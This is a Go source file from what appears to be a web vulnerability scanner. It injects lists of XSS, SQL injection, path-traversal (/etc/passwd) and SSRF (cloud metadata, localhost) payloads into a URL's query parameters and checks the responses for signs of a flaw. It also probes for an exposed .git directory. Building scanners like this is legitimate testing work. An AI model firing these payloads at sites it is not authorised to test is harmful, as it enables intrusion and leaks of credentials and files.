package wsa

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	core "github.com/brezzkin-dev/CINT/internal/cyber/core"
)

var xssPayloads = []string{
	`<script>alert(1)</script>`,
	`"><svg/onload=alert(1)>`,
	`'><img src=x onerror=alert(1)>`,
	`javascript:alert(1)`,
}

var sqliPayloads = []string{
	`'`,
	`''`,
	`' OR '1'='1`,
	`' AND 1=1--`,
	`' AND 1=2--`,
	`1' UNION SELECT NULL--`,
}

var lfiPayloads = []string{
	`../../../../etc/passwd`,
	`....//....//....//etc/passwd`,
	`..%2f..%2f..%2f..%2fetc/passwd`,
}

var ssrfPayloads = []string{
	`http://169.254.169.254/latest/meta-data/`,
	`http://127.0.0.1:22`,
	`http://[::1]:80`,
}

var sqliErrors = []string{
	"you have an error in your sql syntax",
	"warning: mysql_",
	"unclosed quotation mark",
	"quoted string not properly terminated",
	"pg_query():",
	"ora-01756",
	"sqlstate",
	"microsoft ole db provider for sql server",
}

func runInjectionProbes(ctx context.Context, u *url.URL, r *core.Result) {
	params := u.Query()
	if len(params) == 0 {
		r.Add(core.Finding{Tool: "wsa", Severity: core.SevInfo,
			Title: "no query parameters to test"})
		return
	}

	for pname := range params {
		for _, payload := range xssPayloads {
			probe := cloneURL(u, pname, payload)
			st, _, body, err := core.HTTPGet(ctx, probe, nil)
			if err != nil || st != 200 {
				continue
			}
			if strings.Contains(string(body), payload) {
				r.Add(core.Finding{
					Tool: "wsa", Severity: core.SevHigh,
					Title:    "Reflected XSS: " + pname,
					Detail:   "payload echoed unescaped",
					Evidence: map[string]any{"param": pname, "payload": payload, "url": probe},
				})
				break
			}
		}
		for _, payload := range sqliPayloads {
			probe := cloneURL(u, pname, payload)
			st, _, body, err := core.HTTPGet(ctx, probe, nil)
			if err != nil {
				continue
			}
			bodyLower := strings.ToLower(string(body))
			for _, sig := range sqliErrors {
				if strings.Contains(bodyLower, sig) {
					r.Add(core.Finding{
						Tool: "wsa", Severity: core.SevCrit,
						Title:    "SQLi error: " + pname,
						Detail:   "SQL error surfaced on payload",
						Evidence: map[string]any{"param": pname, "payload": payload, "status": st, "sig": sig},
					})
					break
				}
			}
		}
		for _, payload := range lfiPayloads {
			probe := cloneURL(u, pname, payload)
			_, _, body, err := core.HTTPGet(ctx, probe, nil)
			if err != nil {
				continue
			}
			if strings.Contains(string(body), "root:x:0:0") || strings.Contains(string(body), "root:*:") {
				r.Add(core.Finding{
					Tool: "wsa", Severity: core.SevCrit,
					Title:    "LFI: " + pname,
					Detail:   "/etc/passwd leaked via payload",
					Evidence: map[string]any{"param": pname, "payload": payload},
				})
				break
			}
		}
		for _, payload := range ssrfPayloads {
			probe := cloneURL(u, pname, payload)
			_, _, body, err := core.HTTPGet(ctx, probe, nil)
			if err != nil {
				continue
			}
			if strings.Contains(string(body), "aws-ec2") ||
				strings.Contains(string(body), "ssh-") ||
				strings.Contains(string(body), "root:") {
				r.Add(core.Finding{
					Tool: "wsa", Severity: core.SevCrit,
					Title:    "SSRF: " + pname,
					Detail:   "internal resource returned",
					Evidence: map[string]any{"param": pname, "payload": payload},
				})
				break
			}
		}
	}

	base := u.Scheme + "://" + u.Host
	gitURL := base + "/.git/HEAD"
	if st, _, body, _ := core.HTTPGet(ctx, gitURL, nil); st == 200 && strings.HasPrefix(string(body), "ref:") {
		r.Add(core.Finding{
			Tool: "wsa", Severity: core.SevCrit,
			Title:  ".git/HEAD exposed",
			Detail: gitURL,
		})
	}
}

func cloneURL(u *url.URL, key, val string) string {
	cp := *u
	q := cp.Query()
	q.Set(key, val)
	cp.RawQuery = q.Encode()
	return cp.String()
}

func checkTakeover(host string, r *core.Result) {
	r.Add(core.Finding{
		Tool: "wsa", Severity: core.SevInfo,
		Title:  "subdomain-takeover: heuristic-only",
		Detail: "requires DNS CNAME lookup — see notes",
	})
	_ = fmt.Sprintf("")
}
